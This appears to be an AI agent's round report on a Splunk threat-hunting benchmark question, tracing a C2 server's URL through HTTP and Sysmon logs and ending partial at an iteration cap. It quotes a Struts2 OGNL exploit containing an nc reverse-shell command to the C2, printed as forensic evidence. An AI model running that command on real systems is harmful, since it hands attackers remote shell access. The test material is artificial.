# s1 - Q322 - Round 1
_stamped by runner: rounds_remaining=4 novel_spl=8_
**Scope:** sourcetype=stream:http | sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational | sourcetype=access_combined | fields: uri_path, url, dest_ip, src_ip, dest_port, http_method, form_data, EventCode, DestinationIp, DestinationPort, Image
**Insight:** partial
**Candidate:** /images/logos.png   **Confidence:** 62

## Prior rounds
- None — first round on this scope. SH supplied Q314/Q316 context: 45.77.53.176 = external server used by FYODOR-L for recurring 443 C2-like traffic and the 3333 tool download.

## This round
### What I ran
- get_source_types → 102 sourcetypes; stream:http, Sysmon Operational, access_combined present.
- stream:http dest_ip="45.77.53.176" by uri_path → 1 row (2 events): /images/logos.png, GET, port 3333, src 192.168.70.186, url http://45.77.53.176:3333:3333/images/logos.png.
- stream:http "45.77.53.176" (string anywhere) by uri_path → 2 paths: /images/logos.png (3333) and /frothlyinventory/integration/saveGangster.action (POST to 192.168.9.30:8080 from 192.168.8.103).
- Sysmon EC3 DestinationIp=45.77.53.176 by ProcessGuid → 6 powershell.exe guids; five pure-443 (~694–1123 conns each over ~2h), one with 3333+443, one late 443-only (22 conns). No other process images.
- get_raw_events saveGangster → POST from 192.168.8.103 carries the Struts2 OGNL exploit: #cmd='/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe' — reverse shell to the C2.
- stream:http src_ip="45.77.53.176" → 0 events. stream:http "imgur" → 0 events. access_combined "45.77.53.176" → 0 events.
- stream:http src_ip="192.168.8.103" by uri_path → 9 paths: suitecrm browsing (Chrome UA), 17 saveGangster POSTs (python-requests), showcase.action, struts/utils.js, / and /suitecrm/blargh.tgz (PowerShell UA) — attacker's internal foothold, client-only.

### What it means
C2 server = 45.77.53.176 (reverse-shell target in the exploit + powershell.exe beaconing on 443). The only URL recorded as accessed on that server is http://45.77.53.176:3333/images/logos.png → path /images/logos.png. The 443 beacon channel has no HTTP-decoded records, so no competing URL path for it exists in stream:http. Two gaps keep this partial, not FOUND: (1) the 3333 fetch is the payload download — if the question wants the 443 C2 channel's own URL, it is not in stream:http; (2) the example's imgur domain has zero stream:http hits, so an imgur-style answer would live in PowerShell script-block logs, stream:tcp, or DNS, which I did not reach before the tool limit.

## Ruled out
- C2-as-HTTP-client reading (URL fetched BY 45.77.53.176): stream:http src_ip=45.77.53.176 → 0; access_combined "45.77.53.176" → 0.
- /frothlyinventory/integration/saveGangster.action as the answer: URL on the victim 192.168.9.30, POSTed by attacker box 192.168.8.103 — not a URL on the C2 server.
- 192.168.8.103 as the C2 server: client-only (all traffic outbound to 192.168.9.30); its own exploit names 45.77.53.176:8088 as callback.
- imgur in stream:http: 0 events.

_Iteration cap reached: 10/10 iterations used this round — cut off, not finished._

_Premise updates refused by the runner:_
- coverage premise not filed: you already have an open coverage premise p1 - amend or settle that one. The text you sent was discarded: "No URL for the C2's recurring port-443 beacon channel exists in stream:http (it "
